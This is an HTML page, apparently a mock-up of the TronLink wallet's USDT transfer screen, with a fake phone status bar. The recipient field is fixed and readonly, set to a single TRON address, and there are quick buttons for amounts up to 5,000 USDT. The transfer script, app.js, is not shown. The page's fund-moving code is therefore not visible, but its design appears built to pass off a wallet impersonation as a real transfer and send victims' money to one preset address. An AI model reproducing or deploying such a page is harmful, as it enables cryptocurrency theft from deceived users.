<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>USDT 转账 - TronLink</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- 顶部状态栏 -->
    <div class="status-bar">
        <span class="time" id="time">09:41</span>
        <div class="status-icons">
            <span>📶</span>
            <span>📡</span>
            <span>🔋</span>
        </div>
    </div>

    <!-- 主容器 -->
    <div class="app-container">
        <!-- 导航栏 -->
        <div class="navbar">
            <button class="nav-btn back-btn" onclick="goBack()">
                <span>‹ 返回</span>
            </button>
            <h2 class="nav-title">转账</h2>
            <div class="nav-right"></div>
        </div>

        <!-- 主要内容 -->
        <div class="content">
            <!-- 从钱包信息 -->
            <div class="section-title">从</div>
            <div class="wallet-card">
                <div class="wallet-icon">👛</div>
                <div class="wallet-info">
                    <div class="wallet-name">我的钱包</div>
                    <div class="wallet-address" id="walletAddr">正在连接...</div>
                </div>
                <div class="wallet-balance">
                    <div id="balanceDisplay">0.00</div>
                    <div class="balance-unit">USDT</div>
                </div>
            </div>

            <!-- 转账详情 -->
            <div class="section-title" style="margin-top: 24px;">收款地址</div>
            <div class="input-section">
                <input 
                    type="text" 
                    id="recipientAddr" 
                    class="addr-input"
                    value="TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"
                    readonly
                    placeholder="输入收款地址"
                >
                <button class="paste-btn" onclick="copyAddress()">复制</button>
            </div>

            <!-- 转账金额 -->
            <div class="section-title" style="margin-top: 24px;">金额</div>
            <div class="amount-section">
                <div class="amount-input-wrapper">
                    <input 
                        type="number" 
                        id="amount" 
                        class="amount-input"
                        placeholder="0.00"
                        min="0"
                        step="0.01"
                        onchange="updateFee()"
                        oninput="updateFee()"
                    >
                    <div class="amount-unit">USDT</div>
                </div>
                <div class="quick-amount-buttons">
                    <button class="quick-btn" onclick="setAmount(100)">100</button>
                    <button class="quick-btn" onclick="setAmount(500)">500</button>
                    <button class="quick-btn" onclick="setAmount(1000)">1K</button>
                    <button class="quick-btn" onclick="setAmount(5000)">5K</button>
                </div>
            </div>

            <!-- 费用信息 -->
            <div class="fee-section">
                <div class="fee-row">
                    <span class="fee-label">网络费</span>
                    <span class="fee-value" id="networkFee">0.00 USDT</span>
                </div>
                <div class="fee-row">
                    <span class="fee-label">预计到账</span>
                    <span class="fee-value" id="receiveAmount">0.00 USDT</span>
                </div>
                <div class="fee-divider"></div>
                <div class="fee-row total-row">
                    <span class="fee-label">总计</span>
                    <span class="fee-value total-value" id="totalAmount">0.00 USDT</span>
                </div>
            </div>

            <!-- 警告信息 -->
            <div class="warning-box" id="warningBox" style="display: none;">
                <span class="warning-icon">⚠️</span>
                <span class="warning-text">余额不足，请检查账户</span>
            </div>

            <!-- 备注 -->
            <div class="section-title" style="margin-top: 24px;">备注（可选）</div>
            <textarea 
                class="remark-input" 
                placeholder="添加交易备注..."
                maxlength="100"
            ></textarea>

            <!-- 按钮区 -->
            <div class="button-area">
                <button class="btn-confirm" id="confirmBtn" onclick="confirmTransfer()">
                    <span class="btn-text">确认转账</span>
                    <span class="btn-loading" id="btnLoading" style="display: none;">⏳</span>
                </button>
            </div>

            <!-- 安全提示 -->
            <div class="security-notice">
                <span>🔒</span>
                <span>确保地址正确，区块链转账无法撤销</span>
            </div>
        </div>
    </div>

    <!-- 加载动画 -->
    <div class="loading-overlay" id="loadingOverlay" style="display: none;">
        <div class="loading-content">
            <div class="spinner"></div>
            <p id="loadingText">正在处理...</p>
        </div>
    </div>

    <!-- 成功弹窗 -->
    <div class="modal" id="successModal" style="display: none;">
        <div class="modal-content">
            <div class="modal-header">
                <div class="success-icon">✓</div>
                <h3>转账成功</h3>
            </div>
            <div class="modal-body">
                <p class="success-info" id="successInfo">已发送 0.00 USDT</p>
                <p class="tx-hash" id="txHash">交易哈希: 加载中...</p>
            </div>
            <div class="modal-footer">
                <button class="modal-btn" onclick="closeModal()">完成</button>
            </div>
        </div>
    </div>

    <!-- 确认弹窗 -->
    <div class="modal" id="confirmModal" style="display: none;">
        <div class="modal-content">
            <div class="modal-header">
                <h3>确认转账</h3>
            </div>
            <div class="modal-body confirm-body">
                <div class="confirm-item">
                    <span>发送</span>
                    <strong id="confirmAmount">0.00 USDT</strong>
                </div>
                <div class="confirm-item">
                    <span>至</span>
                    <span class="confirm-addr" id="confirmAddr">地址</span>
                </div>
                <div class="confirm-item">
                    <span>网络费</span>
                    <span id="confirmFee">0.00 USDT</span>
                </div>
            </div>
            <div class="modal-footer two-buttons">
                <button class="modal-btn cancel" onclick="cancelConfirm()">取消</button>
                <button class="modal-btn confirm" onclick="executeTransfer()">确认</button>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.min.js"></script>
    <script src="app.js"></script>
</body>
</html>
